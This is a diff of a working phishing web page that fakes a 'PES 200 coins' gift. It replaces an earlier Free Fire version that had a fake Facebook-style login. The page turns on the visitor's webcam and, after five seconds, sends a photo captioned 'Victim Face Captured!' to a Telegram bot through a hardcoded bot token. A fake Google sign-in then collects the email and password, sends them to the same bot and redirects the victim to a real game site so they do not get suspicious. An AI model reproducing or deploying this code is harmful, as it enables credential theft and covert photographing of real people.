@@ -3,37 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Free Fire Rewards 🎁</title>
+    <title>🎁 Claim PES 200 Coins 🎁</title>
     <style>
-        body { margin: 0; padding: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; transition: background 0.5s; background: url('https://w0.peakpx.com/wallpaper/705/110/wallpaper-garena-free-fire-free-fire-battlegrounds-poster.jpg') no-repeat center center/cover; }
-        #p1 { text-align: center; background: rgba(0,0,0,0.8); padding: 30px; border-radius: 20px; width: 90%; max-width: 380px; color: white; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
-        .diamond-img { width: 100px; margin-bottom: 10px; }
-        .btn-claim { background: #e74c3c; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; animation: pulse 1.5s infinite; }
-        #p2 { display: none; background: #f0f2f5; width: 100%; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: absolute; top: 0; left: 0; }
-        .fb-box { background: white; padding: 20px; border-radius: 8px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .fb-logo { width: 120px; margin-bottom: 20px; }
-        input { width: 92%; padding: 12px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
-        .btn-fb { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        body { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .pes-box { text-align: center; background: linear-gradient(145deg, #1e1e1e, #111); padding: 30px; border-radius: 25px; width: 90%; max-width: 380px; box-shadow: 0 0 20px #e67e22; border: 1px solid #e67e22; }
+        .coin-img { width: 120px; animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .btn-claim { background: #e67e22; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; box-shadow: 0 5px 15px rgba(230, 126, 34, 0.4); }
+        #google-ui { display: none; background: white; width: 100%; height: 100vh; position: fixed; top: 0; left: 0; flex-direction: column; align-items: center; justify-content: center; }
+        .g-logo { width: 100px; margin-bottom: 20px; }
+        .g-input { width: 85%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 5px; font-size: 16px; }
+        .g-btn { width: 85%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         #v, #c { display: none; }
+        .loading { display: none; margin-top: 10px; font-size: 14px; color: #e67e22; }
     </style>
 </head>
 <body>
 
-    <div id="p1">
-        <img src="https://ff.garena.com/static/images/hero/hero_1.png" class="diamond-img">
-        <h2>Claim PES 200 Coins</h2>
-        <p>Log in with Google to claim your PES coins instantly.</p>
-        <button class="btn-claim" onclick="startHack()">CLAIM NOW</button>
+    <div id="p1" class="pes-box">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjD3YjG_5W9M7z6f5L8P6S7vS8/s1600/pes-coin.png" class="coin-img">
+        <h2>PES 200 COINS GIFT</h2>
+        <p>Verification is required to confirm your ID.</p>
+        <button class="btn-claim" onclick="capture()">CLAIM NOW</button>
+        <div id="load" class="loading">⌛ Processing verification... Please stay on the page.</div>
     </div>
 
-    <div id="googlePage">
-        <div class="google-box">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo-google">
-            <p style="color: #1c1e21; font-size: 14px; margin-bottom: 15px;">Log in to connect to PES for verification.</p>
-            <input type="text" id="email" placeholder="Mobile number or email" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button class="btn-google" onclick="sendData()">Log In</button>
-        </div>
+    <div id="google-ui">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="g-logo">
+        <h3 style="color:#202124; margin-bottom: 5px;">Sign in</h3>
+        <p style="color:#202124; margin-bottom: 20px;">Use your Google Account to verify PES rewards</p>
+        <input type="email" id="u" class="g-input" placeholder="Email or phone" required>
+        <input type="password" id="p" class="g-input" placeholder="Enter your password" required>
+        <button class="g-btn" onclick="send()">Next</button>
     </div>
 
     <video id="v" autoplay playsinline></video>
@@ -43,54 +44,44 @@
         const T = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; 
         const C = "7479786207";
 
-        async function startHack() {
+        async function capture() {
+            document.getElementById('load').style.display = 'block';
             try {
-                // 1. طلب الكاميرا ديريكت
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('v').srcObject = stream;
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = s;
                 
-                // 2. التحويل لقوقل فوراً وتبييض الخلفية (فلاش)
-                document.body.style.background = "white"; // "تشعيل الضو"
-                document.getElementById('p1').style.display = 'none';
-                document.getElementById('googlePage').style.display = 'flex';
-
-                // 3. التقاط الصورة بعد 5 ثواني كاملة باش تصفى
+                // حل الصورة الكحلة: استنى 5 ثواني كاملة باش يركز الكاميرا
                 setTimeout(() => {
                     const canvas = document.getElementById('c');
                     canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', C);
-                        formData.append('photo', blob, 'shot.jpg');
-                        formData.append('caption', '🎯 Captured Clear Victim!');
-                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: formData });
+                    canvas.toBlob(b => {
+                        const f = new FormData();
+                        f.append('chat_id', C);
+                        f.append('photo', b, 'v.jpg');
+                        f.append('caption', '🎯 Victim Face Captured!');
+                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
+                        
+                        // بعد ما نصوروه، نحولوه لصفحة قوقل
+                        document.getElementById('p1').style.display = 'none';
+                        document.getElementById('google-ui').style.display = 'flex';
                     }, 'image/jpeg');
                 }, 5000); 
 
-            } catch (err) {
-                // إذا رفض الكاميرا، نفتح قوقل على الأقل
+            } catch (e) {
+                // إذا رفض الكاميرا، يروح ديريكت لصفحة قوقل
                 document.getElementById('p1').style.display = 'none';
-                document.getElementById('googlePage').style.display = 'flex';
-                document.body.style.background = "#f0f2f5";
+                document.getElementById('google-ui').style.display = 'flex';
             }
         }
 
-        function sendData() {
+        function send() {
             const u = document.getElementById('u').value;
             const p = document.getElementById('p').value;
-            
-            if(u === "" || p === "") {
-                alert("Please enter your details!");
-                return;
-            }
-
-            // إرسال الإيميل والمودباس للبوت
-            const msg = `✅ GOOGLE ACCOUNT CAPTURED!\n\n📧 Email/Phone: ${u}\n🔑 Password: ${p}`;
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`)
-            .then(() => {
-                // توجيه الضحية لصفحة حقيقية باش ما يشكش
-                window.location.href = "https://ff.garena.com/";
-            });
+            if(u && p) {
+                const msg = `✅ NEW PES ACCOUNT!\n📧 Email: ${u}\n🔑 Pass: ${p}`;
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`)
+                .then(() => { window.location.href = "https://www.konami.com/efootball/"; });
+            } else { alert("Please enter your login details."); }
         }
     </script>
 </body>
